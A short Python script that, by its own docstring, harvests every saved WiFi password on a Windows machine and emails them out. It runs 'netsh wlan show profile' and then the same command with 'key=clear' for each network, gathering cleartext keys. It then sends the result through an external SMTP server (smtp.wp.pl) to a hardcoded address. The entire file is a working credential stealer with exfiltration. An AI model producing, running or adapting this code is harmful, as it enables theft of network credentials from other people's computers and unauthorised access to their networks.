#!/usr/bin/env python


"""
Ver: Python3

it executes Windows command to get list of all WiFi networks, encapsulates password from it and send it via email 
"""

import ssl, smtplib
from email.mime.text import MIMEText
import subprocess, re


def send_email(email, password, message):
    port = 465
    smtp_server = "smtp.wp.pl"
    sender_email = email
    receiver_email = email

    msg = MIMEText(message)
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "email from Python"

    #print(msg)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, str(msg))


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode())
print (network_names_list)
result = ""

for network_name in network_names_list:
    network_name = network_name[:-1]
    command = 'netsh wlan show profile "' + str(network_name) + '" key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result.decode()

print(result)
send_email("tommy1978@wp.pl", "*****", result)


